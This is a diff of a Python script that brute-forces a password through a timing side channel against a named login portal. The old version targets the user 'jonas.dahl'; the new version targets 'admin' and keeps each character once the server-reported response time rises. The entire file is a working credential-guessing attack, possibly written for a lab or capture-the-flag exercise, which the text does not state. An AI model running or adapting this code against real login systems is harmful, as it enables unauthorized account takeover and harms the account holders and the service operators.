@@ -1,57 +1,43 @@
 import requests
-import time
+import string
 
 # URL of the target system's login page
 url = 'https://portal.regjeringen.uiaikt.no/login'
 
 # Username for which to guess the password
-username = 'jonas.dahl'
+username = 'admin'
 
-# Function to measure the response time for a password guess
-def measure_response_time(guess):
+# Function to send a password guess and retrieve the response time
+def send_password_guess(guess):
     data = {
         "username": username,
         "password": guess
     }
-    try:
-        start_time = time.time()
-        response = requests.post(url, json=data, timeout=10)  # 10 seconds timeout
-        end_time = time.time()
-        response_data = response.json()
-        return end_time - start_time, response_data.get("total_time")
-    except requests.exceptions.RequestException as e:
-        print(f"Request error: {e}")
-        return None, None
-    except json.JSONDecodeError:
-        print("Failed to decode JSON from response")
-        return None, None
+    response = requests.post(url, json=data)
+    response_data = response.json()
+    response_time = response_data.get("total_time") - 1
+    return response_time
+    
 
-# Print to confirm the script has started
-print("Script started, beginning password guess...")
+# The initial part of the password (start with a known incorrect character)
+password_guess = '0' * 17
+printable = string.printable
 
-# The initial part of the password (start with an empty string)
-password_guess = ''
-
-# Assuming the maximum length of the password
-for _ in range(20):  # Adjust this range based on the expected password length
-    longest_time = 0
-    next_char = ''
-    print(f"Testing password length: {_ + 1}")
-
-    for char in range(32, 127):  # ASCII printable characters
-        current_guess = password_guess + chr(char)
-        print(f"Trying password: {current_guess}")
-        response_time, server_time = measure_response_time(current_guess)
-
-        if response_time is None:  # Handle the case where the request failed
-            continue
-
-        if server_time > longest_time:
-            longest_time = server_time
-            next_char = chr(char)
-
-    password_guess += next_char
-    print(f"Current guess: {password_guess}")
+# Loop through the password length
+for i in range(17):  # For each character position
+    for char in printable:
+        # Replace the character at position i
+        current_guess = password_guess[:i] + char + password_guess[i+1:]
+        
+        # Measure response time
+        response_time = send_password_guess(current_guess)
+        
+        print(f"Tried {current_guess} and got response time {response_time}")
+        # Check if the response time increased
+        if response_time > i:
+            password_guess = current_guess
+            print(f"Found character at position {i + 1}: {char}")
+            break
 
 # Final password found
 print(f"Password found: {password_guess}")
